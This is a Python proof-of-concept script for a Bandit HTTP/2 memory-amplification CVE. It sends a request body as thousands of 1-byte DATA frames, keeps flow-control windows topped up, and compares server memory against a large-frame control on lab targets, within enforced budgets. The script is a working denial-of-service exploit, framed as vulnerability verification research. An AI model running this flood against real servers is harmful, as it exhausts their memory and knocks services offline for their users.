#!/usr/bin/env python3
"""
PoC: CVE-2026-116078 -- HTTP/2 request bodies made of 1-byte DATA frames
amplify memory use in Bandit.
GHSA-pxjf-g536-7r93 | affected: >= 0.3.1, < 1.14.1 | fixed: 1.14.1

Hypothesis
----------
Mirrors CVE-2026-111101 one layer down the stack: if Bandit allocates or
retains per-frame state (not just per-byte state) while reassembling an
HTTP/2 request body, driving the same payload through thousands of 1-byte
DATA frames instead of a few large ones should cost disproportionately
more server-side memory, for a wire cost only marginally larger (each
HTTP/2 DATA frame has a fixed 9-byte header -- far cheaper per-byte
overhead than HTTP/1 chunk framing, which makes this a *more* efficient
amplification primitive per wire-byte if the same bug class is present).

Method
------
Uses `h2` for correct HPACK/frame encoding over a raw h2c (cleartext
HTTP/2) socket -- h2c avoids needing TLS/ALPN just to reach the upgraded
protocol, and Bandit's lab config (BANDIT_HTTP2=true) accepts h2c via
prior-knowledge negotiation (client sends the HTTP/2 connection preface
immediately; no Upgrade: h2c dance required).

1. Open a TCP connection, send the client connection preface + initial
   SETTINGS.
2. Open one stream, send HEADERS (POST /echo, no END_STREAM).
3. Send the body as N separate 1-byte DATA frames, pacing sends and
   topping up WINDOW_UPDATE as needed so flow control doesn't stall us
   before the frame count itself matters.
4. Compare peak RSS / erlang:memory() against a control that sends the
   same payload as a handful of large DATA frames.
5. Repeat against the patched target.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time

import h2.connection
import h2.config
import h2.events

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from common import (  # noqa: E402
    MemorySampler,
    Target,
    Timer,
    require_lab_target,
    validate_duration_budget,
    validate_payload_budget,
)


def _open_h2_conn(host: str, port: int) -> tuple[socket.socket, h2.connection.H2Connection]:
    sock = socket.create_connection((host, port), timeout=30)
    sock.settimeout(30)
    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    return sock, conn


def _drain(sock: socket.socket, conn: h2.connection.H2Connection, max_reads: int = 50) -> list:
    """Non-blocking-ish drain: read whatever's available, process events, keep
    flow-control windows topped up. Returns accumulated events."""
    events = []
    sock.settimeout(0.5)
    for _ in range(max_reads):
        try:
            data = sock.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        evts = conn.receive_data(data)
        events.extend(evts)
        out = conn.data_to_send()
        if out:
            sock.sendall(out)
    return events


def send_data_frames(host: str, port: int, path: str, n_frames: int, frame_size: int, pace_ms: int) -> dict:
    sock, conn = _open_h2_conn(host, port)
    stream_id = conn.get_next_available_stream_id()

    conn.send_headers(
        stream_id,
        [
            (":method", "POST"),
            (":path", path),
            (":scheme", "http"),
            (":authority", f"{host}:{port}"),
        ],
        end_stream=False,
    )
    sock.sendall(conn.data_to_send())

    payload_unit = b"X" * frame_size
    t0 = time.monotonic()
    sent_bytes = 0
    for i in range(n_frames):
        # Keep window topped up: ask for more credit periodically rather than
        # stalling -- the vulnerability under test is frame *count*, not
        # flow-control enforcement (that's CVE-2026-108525, a separate PoC).
        if conn.outbound_flow_control_window < frame_size * 4:
            conn.increment_flow_control_window(2**20, stream_id=None)
            conn.increment_flow_control_window(2**20, stream_id=stream_id)
            sock.sendall(conn.data_to_send())
            _drain(sock, conn, max_reads=2)

        conn.send_data(stream_id, payload_unit, end_stream=False)
        sock.sendall(conn.data_to_send())
        sent_bytes += frame_size
        if pace_ms:
            time.sleep(pace_ms / 1000)

    conn.end_stream(stream_id)
    sock.sendall(conn.data_to_send())
    elapsed = time.monotonic() - t0

    events = _drain(sock, conn, max_reads=20)
    sock.close()

    return {
        "n_frames": n_frames,
        "frame_size": frame_size,
        "payload_bytes": sent_bytes,
        "wire_bytes_sent_approx": sent_bytes + n_frames * 9,  # +9B DATA frame header each
        "elapsed_s": round(elapsed, 3),
        "events_seen": [type(e).__name__ for e in events][:10],
    }


def send_data_large(host: str, port: int, path: str, total_bytes: int, frame_size: int) -> dict:
    return send_data_frames(host, port, path, n_frames=-(-total_bytes // frame_size), frame_size=frame_size, pace_ms=0)


def run(target: Target, n_frames: int, pace_ms: int):
    print(f"== Target: {target.name} ({target.base_url}) ==")
    before = target.admin_stats()
    before_total = before["erlang_memory"]["total"]
    print(f"  admin/stats before: memory.total={before_total}")

    print(f"  sending {n_frames} x 1-byte DATA frames ...")
    with Timer() as t, MemorySampler(target) as sampler:
        result = send_data_frames(target.host, target.port, "/echo", n_frames, 1, pace_ms)
    peak_1byte = sampler.peak if sampler.peak is not None else before_total
    delta_1byte = max(0, peak_1byte - before_total)
    print(f"  done in {t.elapsed:.2f}s, wire_bytes~={result['wire_bytes_sent_approx']}, "
          f"peak memory delta = {delta_1byte} bytes ({len(sampler.samples)} samples)")

    before2 = target.admin_stats()
    before2_total = before2["erlang_memory"]["total"]
    print(f"  sending control: {n_frames} bytes as large DATA frames ...")
    with MemorySampler(target) as sampler2:
        control = send_data_large(target.host, target.port, "/echo", n_frames, 16384)
    peak_large = sampler2.peak if sampler2.peak is not None else before2_total
    delta_large = max(0, peak_large - before2_total)
    print(f"  done, peak memory delta = {delta_large} bytes (control, "
          f"{len(sampler2.samples)} samples)")

    amplification = (delta_1byte / delta_large) if delta_large > 0 else float("inf")
    print(f"  amplification factor: {amplification:.2f}x")

    return {
        "target": target.name,
        "bandit_version": before.get("bandit_version"),
        "delta_1byte_frames_bytes": delta_1byte,
        "delta_large_frames_bytes": delta_large,
        "peak_1byte_memory_total": peak_1byte,
        "peak_large_memory_total": peak_large,
        "sampler_samples": len(sampler.samples),
        "sampler_errors": sampler.errors + sampler2.errors,
        "amplification_factor": amplification,
        "one_byte_result": result,
        "control_result": control,
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--n-frames", type=int, default=20000, help="number of 1-byte DATA frames to send")
    ap.add_argument("--pace-ms", type=int, default=0, help="delay between frames, ms")
    ap.add_argument("--target", choices=["vulnerable", "interim", "patched", "both"], default="both",
                    help="'both' runs the CVE-appropriate pair (interim 1.14.0 vs patched 1.14.1)")
    args = ap.parse_args()

    # Enforce the experiment bounds from config/lab-limits.yaml before opening
    # a socket. Each 1-byte DATA frame costs 10 wire bytes (9-byte header + 1).
    validate_payload_budget(args.n_frames * 10 + 512)
    validate_duration_budget(args.n_frames * args.pace_ms / 1000)

    # This CVE is fixed only in 1.14.1, so the vulnerable side must be the
    # interim 1.14.0 target -- 1.13.1 would also exercise every 1.14.0 fix.
    targets = require_lab_target(args.target, pair=("interim", "patched"))
    results = [run(t, args.n_frames, args.pace_ms) for t in targets]

    print("\n=== Summary ===")
    for r in results:
        print(f"{r['target']:<12} bandit={r['bandit_version']:<10} "
              f"amplification={r['amplification_factor']:.2f}x "
              f"(1-byte delta={r['delta_1byte_frames_bytes']}B, control delta={r['delta_large_frames_bytes']}B)")


if __name__ == "__main__":
    main()
